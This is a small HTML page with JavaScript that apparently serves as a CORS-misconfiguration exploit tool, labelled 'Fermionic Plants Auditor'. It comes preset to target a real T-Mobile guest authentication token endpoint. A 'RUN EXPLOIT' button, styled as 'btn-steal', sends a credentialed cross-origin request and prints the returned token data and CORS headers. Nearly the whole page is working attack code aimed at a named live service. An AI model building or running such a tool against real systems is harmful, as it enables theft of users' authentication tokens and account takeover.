<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fermionic Plants - Universal Auditor</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e1e1e1; padding: 20px; }
        .wrapper { max-width: 800px; margin: auto; }
        .card { background: #1c2128; border: 1px solid #444c56; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; background: #2d333b; border: 1px solid #444c56; color: white; border-radius: 5px; margin-bottom: 15px; box-sizing: border-box; }
        .btn-steal { background: #e20074; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
        #result-log { background: #0d1117; border: 1px solid #30363d; padding: 15px; font-family: monospace; min-height: 150px; white-space: pre-wrap; margin-top: 15px; border-radius: 5px; }
        .success { color: #39d353; font-weight: bold; }
        .error { color: #f85149; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="card">
        <h1 style="color:#e20074; margin-top:0;">Fermionic Plants Auditor</h1>
        
        <label>Target URL:</label>
        <input type="text" id="targetUrl" value="https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens">

        <label>Method:</label>
        <select id="method">
            <option value="POST">POST</option>
            <option value="GET">GET</option>
        </select>

        <button class="btn-steal" onclick="executeExploit()">RUN EXPLOIT</button>
    </div>

    <div class="card">
        <div id="result-log">Console Ready...</div>
    </div>
</div>

<script>
    async function executeExploit() {
        const url = document.getElementById('targetUrl').value;
        const method = document.getElementById('method').value;
        const log = document.getElementById('result-log');
        
        log.innerHTML = `[*] Sending ${method} request to ${url}...\n`;

        try {
            const response = await fetch(url, {
                method: method,
                mode: 'cors',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: method === 'POST' ? JSON.stringify({}) : null
            });

            const acao = response.headers.get('Access-Control-Allow-Origin');
            const acac = response.headers.get('Access-Control-Allow-Credentials');
            const text = await response.text();

            log.innerHTML += `[+] Status: ${response.status}\n[+] ACAO: ${acao}\n[+] ACAC: ${acac}\n\n`;
            log.innerHTML += `<span class="success">DATA:</span>\n${text}`;
        } catch (err) {
            log.innerHTML += `<span class="error">[!] ERROR: ${err.message}</span>\n\nCheck Burp Repeater for the "Origin" reflection.`;
        }
    }
</script>
</body>
</html>
